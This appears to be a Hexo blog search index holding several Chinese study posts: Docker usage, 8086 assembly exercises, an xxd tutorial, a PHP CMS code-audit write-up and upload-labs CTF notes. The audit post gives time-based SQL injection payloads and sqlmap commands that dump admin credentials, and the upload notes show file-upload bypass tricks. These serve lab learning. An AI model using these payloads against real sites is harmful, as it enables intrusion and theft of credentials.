<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>docker基本使用指南</title>
      <link href="/posts/70b2e753/"/>
      <url>/posts/70b2e753/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-遇到的坑"><a href="#docker-遇到的坑" class="headerlink" title="docker 遇到的坑"></a>docker 遇到的坑</h2><p>运行的时候不能直接用 <code>./</code> 指定当前的文件，需要 <code>$PWD</code></p><p>一次性清理所有的已经关闭的容器<br> <code>docker ps -a | grep Exit | cut -d &#39; &#39; -f 1 | xargs docker rm</code></p><p><code>:ro</code> 表示只读</p><p>访问受到限制</p><p><img src="/posts/70b2e753/1580653426115.png" alt></p><p>此时目录下的文件权限</p><p><img src="/posts/70b2e753/1580653436093.png" alt></p><p>重新运行了一下</p><p><img src="/posts/70b2e753/1580653447982.png" alt></p><p>看来是文件权限的问题，也就是说docker会默认将文件权限直接复制过来，由于我之前的那个用户是pxy，而docker环境中并没有这个用户，导致就变成了1000</p><h2 id="移除镜像"><a href="#移除镜像" class="headerlink" title="移除镜像"></a>移除镜像</h2><pre><code>docker image rm xxxx</code></pre><h2 id="–link-参数"><a href="#–link-参数" class="headerlink" title="–link 参数"></a>–link 参数</h2><p>自动添加了环境变量</p><p><img src="/posts/70b2e753/1580653523204.png" alt></p><p><img src="/posts/70b2e753/1580653527989.png" alt></p><p>还有这个</p><p><img src="/posts/70b2e753/1580653537486.png" alt></p><p><code>/etc/hosts</code> 也会更新</p><p><img src="/posts/70b2e753/1580653546884.png" alt></p><p>神奇。。<br>运行nginx和php-fpm<br><code>docker run --name  myphp-fpm -v $PWD/www:/www  -d php:5.6-fpm</code></p><pre><code>$ docker run --name runoob-php-nginx -p 8083:80 -d \               -v $PWD/www:/usr/share/nginx/html:ro \    -v $PWD/conf/conf.d:/etc/nginx/conf.d:ro \    --link myphp-fpm:php \ ----&gt; 注意需要取别名nginx</code></pre><p>如果不取别名的话直接闪退，别名可以理解成对应的主机地址</p><p><img src="/posts/70b2e753/1580653561167.png" alt></p><p>然后开始折腾docker-compose.yml</p><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php:5.6-fpm    volumes:      - ./www:/www</code></pre><p>试了多次，<code>links</code> 需要取别名</p><p>同时文件的权限也很重要，不然会出现无法读取flag的情况</p><h2 id="nginx配置学习"><a href="#nginx配置学习" class="headerlink" title="nginx配置学习"></a>nginx配置学习</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土二</title>
      <link href="/posts/6cc1a5d6/"/>
      <url>/posts/6cc1a5d6/</url>
      
        <content type="html"><![CDATA[<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>intel的CPU是采用的小端法来存储数据</p><p>在查看内存的时候，我更愿意按照这样的方式，我认为0号应该代表第一根横线，也就是认为是第一个存储单元的开始，也就是说我觉得 0~1 这个单元存放着 20H，因为这样在后续分析栈的时候比较有用</p><p><img src="/posts/6cc1a5d6/1580653048875.png" alt></p><p>字单元：存放一个字节型数据的内存单元，也就是两个字节16位，高位放高地址，低位放低地址</p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>数据段寄存器默认为 ds</p><p>所以我们要操作内存数据的时候只需要指定偏移即可</p><p>CPU不支持直接将数据送入到段寄存器，需要有寄存器作为中转</p><pre><code class="x86asm">mov bx,1000Hmov ds,bxmov [0],al</code></pre><p>上述代码的含义：先设置ds寄存器为1000H，然后将al中的数据送往这个内存单元(所以我们要移动数据到内存的时候是需要先设置数据段的基地址的)</p><h2 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h2><p>mov 段寄存器，寄存器<br>mov 寄存器，段寄存器<br>mov 内存单元，寄存器<br>mov 寄存器，内存单元<br>mov 段寄存器，内存单元<br>mov 内存单元，段寄存器</p><p>但是 add 指令不能直接操作段寄存器和寄存器</p><p><img src="/posts/6cc1a5d6/1580653072050.png" alt></p><h2 id="数据段-1"><a href="#数据段-1" class="headerlink" title="数据段"></a>数据段</h2><p><img src="/posts/6cc1a5d6/1580653090896.png" alt></p><p>AX=0，BX=0</p><pre><code>mov ax,1mov ds,axmov ax,[0000] ;AX = 2662Hmov bx,[0001] ;BX = E626Hmov ax,bx     ;AX = 2662Hmov ax,[0000] ;AX = 2662Hmov bx,[0002] ;BX = D6E6Hadd ax,bx     ;AX = FD48Hadd ax,[0004] ;AX = 2ECC+FD48 = 2C14mov ax,0      ;AX = 0mov al,[0002] ;AX = E6Hmov bx,0      ;BX = 0mov bl,[000c] ;BX = 00Hadd al,bl     ;AX = E6H</code></pre><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>任意时刻 <code>SS:SP</code> 指向栈顶元素</p><p>PUSH 操作的过程</p><ol><li>SP = SP -2</li><li>SS:SP 指向新的地址</li><li>然后将数据送入到 <code>SS:SP</code> 指向的地址中</li></ol><p>然后就涉及到怎么计算 <code>SP</code> 的问题了</p><blockquote><p>只需要记住初始状态栈中没有元素，并且 SP+2 是栈中的第一个存储单元</p></blockquote><p><img src="/posts/6cc1a5d6/1580653127959.png" alt></p><p>POP 指令</p><ol><li>将SS:SP 指向的内存单元数据送入到寄存器中，或者是某个内存单元中</li><li>SP = SP + 2</li></ol><p>PUSH和POP的指令形式</p><pre><code>push 寄存器pop 寄存器push 段寄存器pop 段寄存器push 内存单元pop 内存单元</code></pre><p>利用栈可以达到交换数据的目的</p><pre><code>mov ax,1000Hmov ss,axmov sp,0010Hmov ax,001AHmov bx,001BHpush axpush bxpop axpop bx</code></pre><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p><img src="/posts/6cc1a5d6/1580653176153.png" alt></p><pre><code class="x86asm">mov ax,1000Hmov ds,axmov ax,2000mov ss,axmov sp,0010Hpush[0]push[2]push[4]push[6]push[8]push[A]push[C]push[E]</code></pre><p>现在 1000H~100FH 的内存内容为：</p><p><img src="/posts/6cc1a5d6/1580653193364.png" alt></p><p>本着节约内存的想法</p><p><img src="/posts/6cc1a5d6/1580653210499.png" alt></p><p>然而执行完之后的结果</p><p><img src="/posts/6cc1a5d6/1580653219446.png" alt></p><p>看来节约内存不是件好事，于是我重新把 3000:0 作为代码段</p><p><img src="/posts/6cc1a5d6/1580653228997.png" alt></p><p>这回成功了</p><p><img src="/posts/6cc1a5d6/1580653238046.png" alt></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p><img src="/posts/6cc1a5d6/1580653248493.png" alt></p><pre><code class="x86asm">mov ax,2000Hmov ds,axmov ax,1000Hmov ss,axmov sp,0pop [E]pop [C]pop [A]pop [8]pop [6]pop [4]pop [2]pop [0]</code></pre><p>同样的，我先设置 1000:0 处的值</p><p><img src="/posts/6cc1a5d6/1580653258074.png" alt></p><p>将指令书写到内存中，也就是设置 3000:0 为代码段</p><p><img src="/posts/6cc1a5d6/1580653266322.png" alt></p><p>在实验的时候，前面一部分数据是可以正常复制的，但是后面就出问题了</p><p><img src="/posts/6cc1a5d6/1580653275496.png" alt></p><p>暂时没想清楚</p><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>遇到的问题</p><p>输入指令：</p><p><img src="/posts/6cc1a5d6/1580653286041.png" alt></p><p>但是在执行的时候：</p><p><img src="/posts/6cc1a5d6/1580653293057.png" alt></p><p>这是之后要研究的内容；中断机制<br>Debug的T命令在修改寄存器SS的指令时，下一条指令也会紧接着执行</p><pre><code class="x86asm">mov ax,ffffmov ds,axmov ax,2200mov ss,axmov sp,0100mov ax,[0]     ;ax=C0EAHadd ax,[2]     ;ax=C0FCHmov bx,[4]     ;bx=30Fadd bx,[6]     ;bx=6021Hpush ax        ;sp=FEH,修改的内存单元地址是220FEH,内容为C0FCHpush bx        ;sp=FCH,修改的内存单元地址是220FCH,内容为6021Hpop ax           ;sp=FEH,ax=6021Hpop bx           ;sp=100H,bx=C0FCHpush [4]       ;sp=FEH,修改的内存单元是220FEH,内容为30F0push [6]       ;sp=FCH,修改的内存单元是220FCH,内容为2F31</code></pre><p><img src="/posts/6cc1a5d6/1580653302675.png" alt></p><p>为什么2000:0 ~2000:f 的内容会发生变化？</p><p><img src="/posts/6cc1a5d6/1580653314559.png" alt></p><p>仔细观察发现<br>01A3 不知道是什么，但是0b39和0108确实当前指令的地址，也就是执行完 <code>mov ss,ax mov sp,10H</code> 之后的下一条指令的地址，结合这是在设置栈，不禁想到了函数的压栈，保存了返回地址，但是还有一个 0020 的数据不知道是哪里的</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土一</title>
      <link href="/posts/57418b7f/"/>
      <url>/posts/57418b7f/</url>
      
        <content type="html"><![CDATA[<h2 id="第一、二章"><a href="#第一、二章" class="headerlink" title="第一、二章"></a>第一、二章</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>一个存储单元一般存储 1个字节，也就是8个二进制位</p><p>一个字为两个字节</p><p>地址总线：用来寻址，由于一根地址总线只能表示2个状态，所以一个CPU有N根地址线，则可以说这个CPU的地址总线宽度为N，这样的CPU最多可以寻找 $2^{N}$ 个内存单元</p><p>数据总线：数据总线的宽度意味着CPU一次能传输多少位数据</p><p>控制总线：控制总线的宽度决定了CPU对外部器件的控制能力</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>通用寄存器中，AX可以拆分为 AH和AL，如果单独使用AH或者AL，则应该看成一个独立的8位寄存器来使用，AH和AL此时是不相关的</p><p>如何寻址？<br><img src="/posts/57418b7f/1580566042011.png" alt></p><p>注意此时并不是操作系统中学到的分段，只是这么用罢了</p><p>一个 ‘段’ 的偏移占16位，那么一个段的长度最大为64KB</p><p>不同的段地址和偏移地址可以形成同一个物理地址</p><p>CS:IP 指向的内容就是将要执行的指令(但是CPU是怎么知道指令的长度的呢，x86是变长的，而MIPS是等长的，这个坑之后说)</p><p>基础指令 mov,add,jmp</p><p>mov指令设置寄存器的内容值，add执行加法，jmp设置cs和ip的值</p><p>四条指令完成计算2的4次方</p><pre><code class="x86asm">mov ax,2add ax,axadd ax,axadd ax,ax</code></pre><p>当然也可以使用jmp指令，但是你无法判定程序什么时候退出(因为指令不够hhhh)</p><h2 id="dosbox使用"><a href="#dosbox使用" class="headerlink" title="dosbox使用"></a>dosbox使用</h2><p>dosbox可以用来模拟dos环境，然后我们下载一个MASM工具包，里面包含了 <code>debug</code> 这些程序</p><p>注意设置dosbox</p><pre><code>[autoexec]# Lines in this section will be run at startup.# You can put your MOUNT lines here.mount C: G:\MASMC:</code></pre><p>因为我的 MASM 工具包位于 G盘目录下，所以设置挂载命令<br>这样打开dosbox之后自动挂载</p><p><img src="/posts/57418b7f/1580565800214.png" alt></p><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><p>debug.exe 使用<br>r 命令可以查看寄存器内容，以及当前的 cs:ip 指向，还有ds指向的内容</p><p><img src="/posts/57418b7f/1580565809854.png" alt></p><p>还可以修改寄存器的内容</p><p><img src="/posts/57418b7f/1580565820000.png" alt></p><p>使用d命令查看内存</p><p><code>d1000:9</code></p><p><img src="/posts/57418b7f/1580565830704.png" alt></p><p>查看某一个范围内的内存</p><p><code>d1000:9 20</code></p><p><img src="/posts/57418b7f/1580565845701.png" alt></p><p>e 命令可以修改内存的数据</p><p><code>e1000:0 0 1 2 3 4 5 7 8</code></p><p><img src="/posts/57418b7f/1580565854260.png" alt></p><p>当然也可以换一种方式修改</p><p><img src="/posts/57418b7f/1580565864064.png" alt></p><p>也可以向其中写入字符串</p><p><img src="/posts/57418b7f/1580565875753.png" alt></p><p>尝试写入一段汇编指令</p><p><img src="/posts/57418b7f/1580565886857.png" alt></p><p>使用 e命令编辑内存，然后使用 u 命令反汇编</p><p><img src="/posts/57418b7f/1580565897644.png" alt></p><p>那么如何执行汇编指令呢？</p><p>首先用 r 设置 cs 和 ip的值，然后使用 t 就可以执行汇编指令了，可以看到执行了三条汇编指令后的结果， ax 存储了 0x03   cx 存储了 0x02</p><p><img src="/posts/57418b7f/1580565906622.png" alt></p><p>直接使用 e 命令编辑当然不方便，于是可以用 a 命令直接书写汇编指令，然后自动的给转化成对应的机器码</p><p><img src="/posts/57418b7f/1580565914978.png" alt></p><h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><ol><li>使用debug将下面的程序写入内存，逐条执行</li></ol><p><img src="/posts/57418b7f/1580565925422.png" alt></p><p>汇编指令输入到内存中</p><p><img src="/posts/57418b7f/1580565937645.png" alt></p><p>然后运行就是的了</p><ol start="2"><li>将下面3条指令写入到 2000:0 开始的内存单元中，计算2的次方</li></ol><pre><code class="x86asm">mov ax,1add ax,axjmp 2000:0003</code></pre><p>运行过程截图</p><p><img src="/posts/57418b7f/1580565948449.png" alt></p><ol start="3"><li>PC 机主板上的ROM有一个生产日期，在内存 FFF00H~FFFFFH 的某几个单元中，请找到这个生产日期并试图改变它</li></ol><p><img src="/posts/57418b7f/1580565963720.png" alt></p><p>很显然我是改不了的</p><p><img src="/posts/57418b7f/1580565972814.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> dosbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计初尝</title>
      <link href="/posts/728b20a1/"/>
      <url>/posts/728b20a1/</url>
      
        <content type="html"><![CDATA[<p>全文参考了国光的文章 <a href="https://www.sqlsec.com/2020/01/sinsiu.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/01/sinsiu.html</a></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>文件删除函数只考虑到了白名单路径，但是没有想到 <code>../</code></p><pre><code class="php">function del_file(){    $path = post(&#39;path&#39;);    $path = str_replace(&#39;../&#39;,&#39;&#39;,$path);    $dir[0] = &#39;data/backup/&#39;;    $dir[1] = &#39;images/&#39;;    $dir[2] = &#39;resource/&#39;;    $flag = false;    for($i = 0; $i &lt; count($dir); $i ++)    {        if(substr($path,0,strlen($dir[$i])) == $dir[$i])        {            $flag = true;        }    }    if($flag)    {        if(unlink($path))        {            $result = 1;        }    }    echo isset($result) ? $result : 0;}</code></pre><p>根目录新建 aaaa.txt<br>然后发送请求<br><img src="/posts/728b20a1/1580563907589.png" alt></p><p>成功删除文件</p><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><code>or if(length(database())=6,sleep(3),0)</code><br>如果数据库名的长度为6，那么就 <code>sleep(3)</code><br>我测试的时候数据库名为 <code>xinxiu</code> ，所以就会出现一定的延时</p><p><img src="/posts/728b20a1/1580563920089.png" alt></p><p>延时注入的其他例子</p><pre><code># 判断当前数据库长度 # 当前数据库长度是否为 1 没有延时 不是 cmd=del_admin&amp;id=3 or if(length(database())=1,sleep(3),0) # 延时 表明当前数据库长度为 6 cmd=del_admin&amp;id=3 or if(length(database())=6,sleep(3),0) # 当前数据库第1个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=97,sleep(3),0) # 延时 表明当前数据库第1个字母的ascii码为 115 即 &#39;s&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=115,sleep(3),0) # 当前数据库第2个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=97,sleep(3),0) # 延时 表明当前数据库第2个字母的ascii码为 105 即 &#39;i&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=105,sleep(3),0) ...</code></pre><p>注意这里不能用 and ,因为这个 id=3 的用户实际上不存在，所以就不再需要去执行 and 另一边的语句了(短路！)</p><p>但是如果这个用户存在当然是可以的咯(那样注入就很麻烦了)</p><p><img src="/posts/728b20a1/1580563976163.png" alt></p><p>但是我按照国光的方法使用 sqlmap 失败了</p><pre><code>./sqlmap.py -u &quot;http://127.0.0.1/admin.php?/deal/dir-basic/&quot; --cookie=&quot;qaq21129s234bj1q4ammcs7fe5;&quot; --data=&quot;cmd=del_admin&amp;id=3&quot; -p &quot;id&quot; --technique=T --random-agent -v 3 --tamper=&quot;between&quot; -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p><img src="/posts/728b20a1/1580563990735.png" alt></p><h3 id="另一处后台注入"><a href="#另一处后台注入" class="headerlink" title="另一处后台注入"></a>另一处后台注入</h3><p><code>search_main.php</code> 文件</p><pre><code class="php">    $global[&#39;key&#39;] = rawurldecode($global[&#39;key&#39;]);    $obj = new goods();    $obj-&gt;set_field(&#39;goo_id,goo_title,goo_x_img&#39;);    $obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);    $obj-&gt;set_where(&#39;goo_channel_id = &#39;.get_id(&#39;channel&#39;,&#39;cha_code&#39;,&#39;goods&#39;));</code></pre><p>这里忘记过滤了</p><pre><code class="php">$obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);</code></pre><p><img src="/posts/728b20a1/1580564002356.png" alt></p><p>同样的尝试使用 <code>sqlmap</code> 但是还是失败了(怕是个假的吧)</p><pre><code> ./sqlmap.py -u &quot;http://localhost/?/search/index.html/key-%27*%20%23/&quot; -v 3 --technique=T -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p>后面的几个是菜鸡自己的分析，但是都不是漏洞23333</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>admin/basic_func.php</code> 中：</p><p><code>$global[&#39;channel&#39;]</code> 参数可控，比如访问 <code>/admin.php?/service/mod-user_sheet/</code>,那么获取到的是 <code>service</code> ，之后判断文件是否存在进行包含</p><pre><code class="php">    global $global;    $global = array();    var_dump($_SERVER[&#39;QUERY_STRING&#39;]);    $global[&#39;url&#39;] = $filter($_SERVER[&#39;QUERY_STRING&#39;]);    if($global[&#39;url&#39;] != &#39;&#39;)    {        $arr = explode(&#39;/&#39;,$global[&#39;url&#39;]); //以 / 做分隔符        $global[&#39;channel&#39;] = $arr[1];        var_dump($global);</code></pre><p><img src="/posts/728b20a1/1580564015011.png" alt></p><pre><code class="php">function main(){    global $global,$smarty;    set_global();    include_all(&#39;admin/class&#39;);    set_more_global();    $path = &#39;admin/admin.php&#39;;    if($global[&#39;url&#39;] != &#39;&#39;)    {        $path2 = &#39;admin/&#39;.$global[&#39;channel&#39;].&#39;.php&#39;; //获取到 $global[&#39;channel&#39;] 这个参数可控        var_dump(file_exists($path2));        if(file_exists($path2))        {            $path = $path2;        }    }    include($path);}</code></pre><p>但是这里如果传入 <code>../</code> 那么就会导致 <code>file_exists</code> 返回错误，所以暂时无能为力</p><p><code>admin/common.func.php</code> 文件中</p><pre><code class="php">function run($parameter){    global $smarty;    $path = &#39;&#39;;    $display = &#39;&#39;;    extract($parameter); //extract函数存在变量覆盖，但是参数不可控    $func = &#39;module_&#39;.$module;    include(&#39;admin/module/&#39;.$path.$module.&#39;.php&#39;);    $func($parameter);    if($display != &#39;no&#39;)    {        $smarty-&gt;display(&#39;module/&#39;.$path.$module.&#39;.php&#39;);    }}</code></pre><h2 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h2><p><code>common.func.php</code> 存在一处编辑配置文件</p><p><img src="/posts/728b20a1/1580564028890.png" alt></p><p>当然此处是可以随意修改文件的，只是没办法写shell</p><p><img src="/posts/728b20a1/1580564041634.png" alt></p><p>可见过滤还是挺严格的</p><p><img src="/posts/728b20a1/1580564050184.png" alt></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><code>getRemoteImage.php</code> 文件中，</p><p>可以获取远程图片</p><p>首先必须是 http开头的</p><pre><code class="php">if(strpos($imgUrl,&quot;http&quot;)!==0){                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>校验了后缀名</p><pre><code class="php">            $fileType = strtolower( strrchr( $imgUrl , &#39;.&#39; ) );            if ( !in_array( $fileType , $config[ &#39;allowFiles&#39; ] ) || stristr( $heads[ &#39;Content-Type&#39; ] , &quot;image&quot; ) ) {                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>相关的白名单</p><pre><code class="php">    $config = array(        &quot;savePath&quot; =&gt; &quot;../../images/editor/&quot; ,            //保存路径        &quot;allowFiles&quot; =&gt; array( &quot;.gif&quot; , &quot;.png&quot; , &quot;.jpg&quot; , &quot;.jpeg&quot; , &quot;.bmp&quot; ) , //文件允许格式        &quot;maxSize&quot; =&gt; 30000                    //文件大小限制，单位KB    );</code></pre><p>之后会读取文件</p><pre><code class="php">readfile( $imgUrl,false,$context);</code></pre><p>这么看来感觉问题不大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-21" target="_blank" rel="noopener">PHP代码审计初尝</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-xxd</title>
      <link href="/posts/2e8d4a2a/"/>
      <url>/posts/2e8d4a2a/</url>
      
        <content type="html"><![CDATA[<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>基本选项</p><ul><li>-a : 它的作用是自动跳过空白内容，默认是关闭的</li><li>-c : 它的后面加上数字表示每行显示多少字节的十六进制数，默认是16字节。</li><li>-g : 设定以几个字节为一块，默认为2字节。</li><li>-l : 显示多少字节的内容。</li><li>-s : 后面接【+-】和address.加号表示从地址处开始的内容，减号表示距末尾address开始的内容。</li><li>-ps: output in postscript plain hexdump style</li></ul><p>xxd 是有单位的，如</p><p><img src="/posts/2e8d4a2a/1580557821863.png" alt></p><p>和</p><p><img src="/posts/2e8d4a2a/1580557833258.png" alt></p><p>很显然其中一个 0x100 是 256个字节，也就是16行咯</p><h3 id="g-选项的含义"><a href="#g-选项的含义" class="headerlink" title="-g 选项的含义"></a>-g 选项的含义</h3><p>默认是两个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20 monster.jpg00002601: eeae ee33 b2ae ae9b b979 0eb8 e171 a040  ...3.....y...q.@00002611: 2146 78f7 d5a0 fef0 79e7 5135 fbf5 7f48  !Fx.....y.Q5...H</code></pre><p>通过 -g 变为一个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 monster.jpg 00002601: ee ae ee 33 b2 ae ae 9b b9 79 0e b8 e1 71 a0 40  ...3.....y...q.@00002611: 21 46 78 f7 d5 a0 fe f0 79 e7 51 35 fb f5 7f 48  !Fx.....y.Q5...H</code></pre><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>如果我只想要十六进制,加上 -ps 选项</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1  -ps monster.jpg eeaeee33b2aeae9bb9790eb8e171a040214678f7d5a0fef079e75135fbf57f48</code></pre><p>​    可以输出C语言数组形式</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 -i  monster.jpg unsigned char monster_jpg[] = {  0xee, 0xae, 0xee, 0x33, 0xb2, 0xae, 0xae, 0x9b, 0xb9, 0x79, 0x0e, 0xb8,  0xe1, 0x71, 0xa0, 0x40, 0x21, 0x46, 0x78, 0xf7, 0xd5, 0xa0, 0xfe, 0xf0,  0x79, 0xe7, 0x51, 0x35, 0xfb, 0xf5, 0x7f, 0x48};unsigned int monster_jpg_len = 32;</code></pre><h2 id="与vim结合"><a href="#与vim结合" class="headerlink" title="与vim结合"></a>与vim结合</h2><p><code>vim 文件名 -b</code> 以二进制方式打开文件</p><p>然后输入命令 <code>%!xxd</code></p><p>就可以进入到十六进制编辑模式</p><p>编辑完之后需要用 <code>%!xxd -r</code> 保存，退回到原来的vim模式</p><h2 id="反向dump"><a href="#反向dump" class="headerlink" title="反向dump"></a>反向dump</h2><pre><code class="bash"># pxy @ LAPTOP-UBIEP4K5$ xxd monster.jpg file.dump# pxy @ LAPTOP-UBIEP4K5$ head -n 4 file.dump 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......00000010: 0001 0000 ffdb 0043 0008 0606 0706 0508  .......C........00000020: 0707 0709 0908 0a0c 140d 0c0b 0b0c 1912  ................00000030: 130f 141d 1a1f 1e1d 1a1c 1c20 242e 2720  ........... $.&#39;# pxy @ LAPTOP-UBIEP4K5 $ xxd -r file.dump &gt; a.jpg# pxy @ LAPTOP-UBIEP4K5 $ file a.jpg a.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 160x247, components 3</code></pre><p>这样比较方便，可以转成其他文件，进行编辑之后再转回来，本质上和vim一起用的效果一样</p><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxd </tag>
            
            <tag> hexdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天以一道leetcode-链表题</title>
      <link href="/posts/2e6a5f8a/"/>
      <url>/posts/2e6a5f8a/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>safeharbor靶机渗透</title>
      <link href="/posts/1f38a4f2/"/>
      <url>/posts/1f38a4f2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-lab做题笔记</title>
      <link href="/posts/5877398d/"/>
      <url>/posts/5877398d/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><pre><code class="php">php &gt; $a = array(1,2,3,4,5);php &gt; current($a);php &gt; echo current($a);1php &gt; echo next($a);2php &gt; echo current($a);2php &gt; echo end($a);5php &gt; echo current($a);5php &gt; echo reset($a);1php &gt; echo current($a);</code></pre><p>于是这样就可以理解了</p><p><img src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><pre><code class="php">$file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];if (!is_array($file)) {    $file = explode(&#39;.&#39;, strtolower($file));}var_dump($file);$ext = end($file);var_dump($ext);$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);if (!in_array($ext, $allow_suffix)) {    $msg = &quot;禁止上传该后缀文件!&quot;;}else{    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;    if (move_uploaded_file($temp_file, $img_path)) {        $msg = &quot;文件上传成功！&quot;;        $is_upload = true;    } else {</code></pre><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可</p><p><img src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><pre><code class="php">    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);</code></pre><p>我们上传一个 <code>shell.php</code><br>内容为：</p><pre><code class="php">&lt;?php file_put_contents(&quot;info.php&quot;, &quot;&lt;?php phpinfo(); ?&gt;&quot;)?&gt;</code></pre><p>之后去访问这个文件，就能生成 info.php</p><p><img src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src="/posts/5877398d/1580564202994.png" alt></p>]]></content>
      
      
      <categories>
          
